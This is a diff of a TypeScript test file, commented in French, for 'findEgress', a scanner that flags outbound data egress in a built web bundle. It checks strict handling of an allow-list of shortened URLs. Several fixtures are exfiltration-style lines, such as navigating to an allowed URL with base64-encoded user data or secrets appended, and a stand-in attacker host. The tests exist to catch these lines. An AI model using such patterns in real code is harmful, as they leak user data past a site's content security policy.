@@ -174,6 +174,56 @@ describe('findEgress', () => {
     expect(hits[0]?.file).toBe('assets/probe.worker-abc.js')
   })
 
+  it('laisse passer les deux liens de documentation émis par Dexie', () => {
+    // Ils entrent avec le socle de données au lot B1. Ce sont des littéraux de message
+    // d'exception (`dexie.js` l. 381 et 4749) : aucun code ne les déréférence.
+    const hits = findEgress([
+      {
+        file: 'assets/index.js',
+        code: 'e="IndexedDB API missing. Please visit https://tinyurl.com/y2uuvskb";f="Transaction committed too early. See http://bit.ly/2kdckMn"',
+      },
+    ])
+    expect(hits).toEqual([])
+  })
+
+  it("n'ouvre PAS le raccourcisseur : une autre cible du même domaine reste refusée", () => {
+    // LE test qui compte. Autoriser `tinyurl.com/*` aurait laissé un tiers choisir la destination,
+    // aujourd'hui ou demain. La tolérance est une meurtrière, pas une porte — et elle doit le
+    // rester même quand quelqu'un « simplifiera » la règle en pattern de domaine.
+    const hits = findEgress([
+      { file: 'a.js', code: 'x="https://tinyurl.com/autre-chose"' },
+      { file: 'b.js', code: 'y="http://bit.ly/exfiltration"' },
+      // Même identifiant, autre domaine : la règle est ancrée, pas cherchée en sous-chaîne.
+      { file: 'c.js', code: 'z="https://mechant.example/y2uuvskb"' },
+    ])
+    expect(hits).toHaveLength(3)
+  })
+
+  it('refuse une URL autorisée AUGMENTÉE d’une query ou d’un fragment', () => {
+    // La brèche que ce test verrouille, trouvée en revue et bien réelle : l'extracteur d'URL
+    // s'arrêtait au `?`, donc l'ancre `$` d'une entrée « exacte » portait sur une URL TRONQUÉE.
+    // `https://tinyurl.com/y2uuvskb?d=<dossier>` était déclaré conforme — et comme la CSP ne
+    // couvre pas la navigation de premier niveau, le dossier sortait pour de bon.
+    const hits = findEgress([
+      { file: 'a.js', code: 'location.href="https://tinyurl.com/y2uuvskb?d="+btoa(dossier)' },
+      { file: 'b.js', code: 'a.href="https://tinyurl.com/y2uuvskb#"+secret' },
+      { file: 'c.js', code: 'location.href="http://bit.ly/2kdckMn?x="+data' },
+      // Vaut pour TOUTE entrée de la liste, pas seulement les raccourcisseurs.
+      { file: 'd.js', code: 'x="https://react.dev/errors/?fuite="+d' },
+    ])
+    expect(hits).toHaveLength(4)
+    expect(hits[0]?.evidence).toContain('?d=')
+  })
+
+  it('refuse la navigation scriptée, que la CSP ne couvre pas', () => {
+    const hits = findEgress([
+      { file: 'a.js', code: 'location.assign(u)' },
+      { file: 'b.js', code: 'location.replace(u)' },
+      { file: 'c.js', code: 'window.open(u)' },
+    ])
+    expect(hits).toHaveLength(3)
+  })
+
   it('refuse les primitives de sortie, que la minification ne renomme pas', () => {
     const hits = findEgress([
       { file: 'a.js', code: 'navigator.sendBeacon(u,d)' },
@@ -204,6 +254,6 @@ describe('formatIsolationFailure', () => {
     const message = formatIsolationFailure(hits)
     expect(message).toContain('src/lib/supabase.ts')
     expect(message).toContain('singleton du client Supabase')
-    expect(message).toContain('landing/_headers')
+    expect(message).toContain('web/public-builder/_headers')
   })
 })
